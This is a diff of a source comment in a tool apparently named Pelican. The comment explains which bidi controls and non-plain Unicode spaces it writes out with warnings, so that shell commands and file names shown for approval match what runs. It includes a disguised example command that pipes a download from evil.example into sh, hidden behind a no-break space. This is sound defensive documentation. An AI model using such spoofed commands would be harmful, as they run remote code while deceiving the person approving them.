@@ -2,9 +2,9 @@
  * Which characters Pelican writes out, as ⟨U+202E⟩, with a warning, where what you read decides
  * what runs or is sent: an approval, what a folder brings before you trust it, a file Claude sends
  * you and the name you save it under. Claude Code and Claude Desktop show such text as it is; this
- * is Pelican's own addition, and it means to warn of every character that can make what you read
- * differ from what runs or is sent, and of nothing else: a warning that comes with ordinary text
- * teaches you to pass it by.
+ * is Pelican's own addition, and it means to warn of the characters that can make what you read
+ * differ from what runs or is sent, within the limits below, and of nothing else: a warning that
+ * comes with ordinary text teaches you to pass it by.
  *
  * Written out, wherever they are:
  * - what turns text around, the bidi controls (U+202A to U+202E, U+2066 to U+2069, U+200E, U+200F,
@@ -25,20 +25,25 @@
  *
  * A space other than a plain one (no-break U+00A0, narrow U+202F, full width U+3000, thin and the
  * rest of Unicode's spaces) shows as a space (the Ogham space mark, U+1680, as a dash), in a
- * command's monospace as wide as a plain one or wider. A shell splits words only at a plain space, a tab or a newline, so it takes one of these as
- * part of a word: `echo done⟨U+00A0⟩# ; curl -s https://evil.example/x | sh` reads as a comment
- * but runs curl (a `#` starts a comment only at the start of a word), and
- * `LC_ALL=C⟨U+00A0⟩cat ./setup.sh` runs ./setup.sh (cat becomes part of the variable). So
- * in a shell command (`runs: 'shell'`) it is written out wherever the shell reads it as part of a
- * word: outside quotes, the bodies of heredocs and comments, in the command and in what it hands
- * to a shell, as src/shared/shell-words.ts reads it; in a heredoc's delimiter too. In quotes, a
- * heredoc's body or a comment it is text, there as in the output the shell may later split into
- * words (an unquoted `$( )`, a variable): a quoted screenshot's name or a commit message with a
- * full-width space shows as it is. Shown joined by spaces, a program's arguments (`runs: 'argv'`)
- * write out every one, as nothing tells it from the space between two arguments. Elsewhere it is
- * left as it is: in a path, a name or words it is the space it shows, and written out it would warn
- * of every macOS screenshot (U+202F before AM), French quotation and CJK sentence that holds one.
- * A PowerShell command keeps it too: PowerShell takes every Unicode space for a space, as it reads.
+ * command's monospace as wide as a plain one or wider. A shell splits words only at a plain space,
+ * a tab or a newline, so it takes one of these as part of a word: `echo done⟨U+00A0⟩# ; curl -s
+ * https://evil.example/x | sh` reads as a comment but runs curl (a `#` starts a comment only at the
+ * start of a word), and `LC_ALL=C⟨U+00A0⟩cat ./setup.sh` runs ./setup.sh (cat becomes part of the
+ * variable). So in a shell command (`runs: 'shell'`) every one is written out but where
+ * src/shared/shell-words.ts finds it, for sure, quoted, in a heredoc's body or in a comment, as
+ * bash, zsh, dash and macOS's bash 3.2 read the command and the scripts it hands to a shell in the
+ * ways that file lists; where it cannot tell, every one is. A quoted screenshot's name, or a commit
+ * message with a full-width space in Claude Code's `"$(cat <<'EOF' … EOF)"`, shows as it is. What
+ * that file does not follow shows as it is too: a quoted string that a program other than those
+ * runs in a shell of its own (python's os.system, make), a script in a file the command does not
+ * write itself, and the output of a `$( )` that the shell splits into words (there such a space
+ * can only join two arguments).
+ *
+ * Shown joined by spaces, a program's arguments (`runs: 'argv'`) write out every one, as nothing
+ * tells it from the space between two arguments. Elsewhere such a space is left as it is: in a
+ * path, a name or words it is the space it shows, and written out it would warn of every macOS
+ * screenshot (U+202F before AM), French quotation and CJK sentence that holds one. A PowerShell
+ * command keeps it too: PowerShell takes every Unicode space for a space, as it reads.
  *
  * Written out in a command, a path, a name, a rule or a tool's input, which show in monospace:
  * U+FA2E and U+FA2F, compatibility ideographs that the monospace font draws as a blank in Chrome
